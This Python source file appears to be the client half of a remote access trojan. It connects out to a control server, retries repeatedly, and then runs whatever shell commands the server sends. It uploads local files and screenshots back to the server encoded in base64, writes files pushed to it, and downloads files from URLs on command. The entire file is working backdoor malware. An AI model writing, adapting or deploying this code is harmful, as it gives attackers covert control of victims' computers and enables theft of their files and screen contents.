#!/usr/bin/python
import socket
import subprocess
import json
import os
import struct
import utils
import base64
import time
import requests
from mss import mss
import os


def download(url):
    res = requests.get(url)
    if(res.status_code == 200):
        file_name = url.split("/")[-1]
        with open(file_name,"wb") as out_file:
            out_file.write(res.content)
    else:
        raise Exception()

def screenshot():
    with mss() as screenshot:
        screenshot.shot()

def connection_loop(sock):
    MAX_TRIES = 100
    for i in range(MAX_TRIES):
        try:
            sock.connect(("0.0.0.0", 11221))
            print("Connected to server")
            shell(sock)
        except: 
            print("Error while trying to connect to the server")
            print("Retrying...")
            time.sleep(10)
            continue
    print("Maximum tries reached, shutting down client now.")

def shell(sock):
    while True:
        result = ""
        cmd = utils.receive_frame(sock)
        print(cmd)
        if cmd == "q":
            continue
        elif cmd == "close":
            break    
        elif cmd[:7] == "sendall":
            proc = subprocess.Popen(cmd[8:], shell=True, stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        elif cmd[:2] == "cd" and len(cmd.strip()) > 3:
            try:
                os.chdir(cmd[3:])
            except Exception as e:
                result = str(e)
        elif cmd[:8] == "download":
            try:
                with open(cmd[9:],"rb") as f:
                    encoded_file = base64.b64encode(f.read())
                    utils.reliable_send(sock, encoded_file.decode("utf-8"))
            except:
                    utils.reliable_send(sock, "DOWNLOAD_FAIL")
        elif cmd[:6] == "upload":
                file_data = utils.receive_frame(sock)
                if file_data == "UPLOAD_FAIL":
                        result = "Failed to upload"
                else:
                    with open(cmd[7:],"wb") as f:
                        f.write(base64.b64decode(file_data))
                        result = "File Uploaded!"   
        elif cmd[:3] == "get":
            try:
                download(cmd[4:])
                result = "File downloaded from url"
            except:  
                result = "File NOT downloaded from url"
        elif cmd[:10] == "screenshot":
            try:
                screenshot()
                with open("monitor-1.png","rb") as f:
                    encoded_file = base64.b64encode(f.read())
                    utils.reliable_send(sock, encoded_file.decode("utf-8"))
                os.remove("monitor-1.png")
            except:
                utils.reliable_send(sock, "SCREENSHOT_FAIL")
        else:
            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = (proc.stdout.read() + proc.stderr.read()).decode("utf-8")
        utils.reliable_send(sock, result)

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connection_loop(sock)
    sock.close()

if __name__ == "__main__":
    main()
